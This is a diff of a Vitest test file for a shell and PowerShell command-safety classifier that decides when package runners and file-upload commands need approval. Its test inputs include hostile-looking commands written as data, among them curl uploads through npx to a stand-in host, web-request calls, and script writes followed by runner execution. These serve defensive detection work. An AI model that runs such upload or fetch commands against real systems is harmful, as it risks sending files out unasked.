@@ -1,7 +1,7 @@
 import { describe, expect, it } from "vitest";
 import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
 import { POWERSHELL_FILE_TYPES } from "../rules/powershell-file-provenance.js";
-import { hiddenCodeReason, refusedShellPrefix, SHELL_PREFIX_POLICY } from "../rules/shell-prefix-policy.js";
+import { hiddenCodeReason, opaqueRunnerReason, refusedShellPrefix, SHELL_PREFIX_POLICY } from "../rules/shell-prefix-policy.js";
 import { analyzeShellForRules } from "../rules/shell-rule-matcher.js";
 import { shellExfiltrationSignal } from "../rules/shell-exfiltration.js";
 
@@ -15,12 +15,12 @@ const RUNNERS = [
 const RUNNER_ARGUMENTS: Readonly<Record<string, string>> = {
   npx: "tsc --version", bunx: "tsc --version", pnpx: "tsc --version",
   uvx: "ruff check .", pipx: "run black --check .", corepack: "pnpm install",
-  yarnpkg: "test", deno: "task test",
+  yarnpkg: "test", deno: "task test", npm: "test", pnpm: "test", yarn: "test", bun: "test",
 };
 const CALL_RUNNERS = SHELL_PREFIX_POLICY.packageRunners.flatMap((runner) => {
   const args = RUNNER_ARGUMENTS[runner];
   if (args === undefined) throw new Error(`Missing runner arguments: ${runner}`);
-  return ["", args].map((suffix) => ({ command: `& ${runner}${suffix ? ` ${suffix}` : ""}`, stdin: runner === "deno" && suffix === "" }));
+  return ["", args].map((suffix) => ({ command: `& ${runner}${suffix ? ` ${suffix}` : ""}` }));
 });
 const RUNNER_CODE = [
   ...["npx", "pnpx", "bunx", "pnpm dlx", "yarn dlx"].flatMap((runner) => [
@@ -52,26 +52,35 @@ const FORWARDED_UPLOADS = [
 describe("package runner shims and dispatchers", () => {
   it.each([...RUNNER_CODE, ...UNKNOWN_RUNNER_OPTIONS].flatMap((command) => [command, `& ${command}`]))
   ("requires approval for runner code or unmodeled options: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD).exfiltration).not.toBeNull();
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
   });
 
   it.each(RUNNER_CODE)("classifies runner code in the shared shell policy: %s", (command) => {
-    expect(analyzeShellForRules(command).hidden.length).toBeGreaterThan(0);
+    expect(analyzeShellForRules(command)).toMatchObject({ hidden: [], ordinaryAsk: "opaque runner prefix" });
   });
 
   it.each(UNKNOWN_RUNNER_OPTIONS)("retains an ask classification for an unknown runner binding: %s", (command) => {
     const shape = analyzeShellForRules(command);
     expect(shape.ok).toBe(true);
-    if (shape.ok) expect(shape.ordinaryAsk ?? shape.hidden[0]).toBeTruthy();
+    if (shape.ok) expect(shape).toMatchObject({ hidden: [], ordinaryAsk: "opaque runner prefix" });
   });
 
-  it.each(["npx curl http://e", ...FORWARDED_UPLOADS].flatMap((command) => [command, `& ${command}`]))
-  ("retains the downstream floor through a runner: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD).exfiltration).not.toBeNull();
+  it.each(FORWARDED_UPLOADS.flatMap((command) => [command, `& ${command}`]))
+  ("distinguishes downstream senders from opaque package identities: %s", (command) => {
+    if (command.replace(/^& /, "") === "npx curl@1 -T notes.txt http://e") {
+      expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: "opaque runner prefix" });
+    } else {
+      expect(inspectPowerShellCommand(command, CWD).exfiltration).not.toBeNull();
+    }
   });
 
-  it.each(FORWARDED_UPLOADS)("retains the downstream file-transfer floor in the other shell: %s", (command) => {
-    expect(shellExfiltrationSignal(command, CWD)).not.toBeNull();
+  it.each(["npx curl http://e", "& npx curl http://e"])("keeps a downstream GET ordinary: %s", (command) => {
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
+  });
+
+  it.each(FORWARDED_UPLOADS)("distinguishes downstream senders in the other shell: %s", (command) => {
+    if (command === "npx curl@1 -T notes.txt http://e") expect(shellExfiltrationSignal(command, CWD)).toBeNull();
+    else expect(shellExfiltrationSignal(command, CWD)).not.toBeNull();
   });
 
   it("retains file-derived variables through forwarded argv", () => {
@@ -89,91 +98,88 @@ describe("package runner shims and dispatchers", () => {
     ["npx", ...Array<string>(24).fill("npx"), "helper"],
     ["npx", "helper", ...Array<string>(1024).fill("a")],
     ["npx", "helper", "a".repeat(65_537)],
-  ])("fails closed on bounded runner analysis: %#", (...argv) => {
-    expect(hiddenCodeReason(argv)).toMatch(/analysis budget exceeded/);
+  ])("keeps oversized runner argv opaque: %#", (...argv) => {
+    expect(opaqueRunnerReason(argv)).toBe("opaque runner prefix");
+    expect(hiddenCodeReason(argv)).toBeNull();
   });
 
   it.each(Object.entries(TASK_ARGUMENTS).flatMap(([runner, args]) => [`${runner} ${args}`, `& ${runner} ${args}`]))
-  ("keeps ordinary runner tasks in normal flow: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD)).toEqual({ sensitive: null, exfiltration: null });
+  ("asks ordinarily for literal runner tasks: %s", (command) => {
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
     expect(analyzeShellForRules(command.replace(/^& /, "")).hidden).toEqual([]);
   });
 
   it.each(Object.entries(TASK_ARGUMENTS).flatMap(([runner, args]) =>
     [`${runner} ${args} 'iwr x'`, `& ${runner} ${args} 'iwr x'`]))
-  ("does not prove effect-bearing task arguments are data: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD).exfiltration).not.toBeNull();
+  ("keeps command-looking runner arguments ordinary: %s", (command) => {
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
   });
 
-  it.each(CALL_RUNNERS)("retains normal call-operator flow: $command", ({ command, stdin }) => {
-    expect(inspectPowerShellCommand(command, CWD)).toEqual({
-      sensitive: null, exfiltration: stdin ? "PowerShell hidden code (runtime script)" : null,
-    });
+  it.each(CALL_RUNNERS)("asks ordinarily through the call operator: $command", ({ command }) => {
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
   });
 
   it.each(CALL_RUNNERS)("requires approval after a write through the call operator: $command", ({ command }) => {
-    expect(inspectPowerShellCommand(`Set-Content package.json x; ${command}`, CWD).exfiltration)
-      .toContain("materialized task input");
+    expect(inspectPowerShellCommand(`Set-Content package.json x; ${command}`, CWD)).toMatchObject({
+      sensitive: null, exfiltration: null, ordinaryAsk: "opaque runner prefix",
+    });
   });
 
   it.each(SHELL_PREFIX_POLICY.packageRunners)("requires approval for opaque call-operator arguments to %s", (runner) => {
-    expect(inspectPowerShellCommand(`& ${runner} $opaque`, CWD).exfiltration).not.toBeNull();
+    expect(inspectPowerShellCommand(`& ${runner} $opaque`, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
   });
 
-  it.each(SHELL_PREFIX_POLICY.packageRunners)("keeps bare %s subject to intrinsic code checks only", (runner) => {
+  it.each(SHELL_PREFIX_POLICY.packageRunners)("asks ordinarily for bare %s", (runner) => {
     const result = inspectPowerShellCommand(runner, CWD);
-    expect(hiddenCodeReason([runner])).toBe(runner === "deno" ? "deno reads code from stdin" : null);
-    expect(result).toEqual({
-      sensitive: null,
-      exfiltration: runner === "deno" ? "PowerShell hidden code (runtime script)" : null,
-    });
+    expect(hiddenCodeReason([runner])).toBeNull();
+    expect(opaqueRunnerReason([runner])).toBe("opaque runner prefix");
+    expect(result).toEqual({ sensitive: null, exfiltration: null, ordinaryAsk: "opaque runner prefix" });
     expect(refusedShellPrefix([runner])).not.toBeNull();
   });
 
   it.each(SHELL_PREFIX_POLICY.packageRunners)("requires approval for bare %s after materialization", (runner) => {
-    expect(inspectPowerShellCommand(`Set-Content package.json x; ${runner}`, CWD).exfiltration)
-      .toContain("materialized task input");
+    expect(inspectPowerShellCommand(`Set-Content package.json x; ${runner}`, CWD))
+      .toEqual({ sensitive: null, exfiltration: null, ordinaryAsk: "opaque runner prefix" });
   });
 
   it.each(RUNNERS.flatMap((runner) => [
     `Set-Content package.json x; ${runner}`,
     `Set-Content payload.ps1 Get-Date; ${runner}`,
   ]))("requires approval after a file write: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD).exfiltration).toContain("materialized task input");
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
   });
 
-  it.each(RUNNERS)("retains normal flow without a file write: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD)).toEqual({ sensitive: null, exfiltration: null });
+  it.each(RUNNERS)("asks ordinarily without a file write: %s", (command) => {
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
   });
 
   it.each([
     "npm.ps1 --version", "corepack --version", "yarnpkg --help", "deno --version",
-  ])("retains exact informational arguments after a write: %s", (runner) => {
+  ])("keeps informational runner arguments ordinary after a write: %s", (runner) => {
     expect(inspectPowerShellCommand(`Set-Content package.json x; ${runner}`, CWD))
-      .toEqual({ sensitive: null, exfiltration: null });
+      .toEqual({ sensitive: null, exfiltration: null, ordinaryAsk: "opaque runner prefix" });
   });
 
   it.each(["npm.ps1 --version", "corepack --version", "yarnpkg --help", "deno --version"])
   ("requires approval when the informational runner itself was written: %s", (runner) => {
     const executable = runner.split(" ")[0]!;
-    expect(inspectPowerShellCommand(`Set-Content ${executable} Get-Date; ${runner}`, CWD).exfiltration)
-      .toContain("materialized file");
+    const result = inspectPowerShellCommand(`Set-Content ${executable} Get-Date; ${runner}`, CWD);
+    expect(result).toMatchObject({ exfiltration: null, ordinaryAsk: expect.any(String) });
   });
 
   it.each(Object.entries(POWERSHELL_FILE_TYPES).filter(([extension, type]) => extension && type !== "document").map(([extension]) => extension))
-  ("recognizes the materialized runner through catalogued extension %s", (extension) => {
-    expect(inspectPowerShellCommand(`Set-Content package.json x; npm${extension} test`, CWD).exfiltration)
-      .toContain("materialized task input");
+  ("recognizes an opaque runner through catalogued extension %s", (extension) => {
+    expect(inspectPowerShellCommand(`Set-Content package.json x; npm${extension} test`, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
   });
 
   it.each(["npm.bat test", "npm.cmd test", "npm.exe test"])
   ("retains the existing opaque executable check without a write: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD).exfiltration).toContain("opaque executable file payload");
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
   });
 
   it("does not treat a document suffix as a runner shim", () => {
-    expect(inspectPowerShellCommand("Set-Content package.json x; npm.txt test", CWD).exfiltration)
-      .toContain("opaque executable file payload");
+    expect(inspectPowerShellCommand("Set-Content package.json x; npm.txt test", CWD))
+      .toMatchObject({ exfiltration: null, ordinaryAsk: expect.stringContaining("opaque executable file payload") });
   });
 
   it.each([
@@ -184,10 +190,11 @@ describe("package runner shims and dispatchers", () => {
     expect(SHELL_PREFIX_POLICY.packageRunners).toContain(name);
     expect(refusedShellPrefix(argv)).toBeNull();
     expect(hiddenCodeReason(argv)).toBeNull();
+    expect(opaqueRunnerReason(argv)).toBe("opaque runner prefix");
   });
 
   it.each([
-    ["corepack", "package-runner"], ["yarnpkg", "package-runner"], ["deno", "interpreter"],
+    ["corepack", "package-runner"], ["yarnpkg", "package-runner"], ["deno", "package-runner"],
   ] as const)("keeps an unconstrained prefix for %s out of persistent rules", (name, reason) => {
     expect(refusedShellPrefix([name])).toBe(reason);
   });
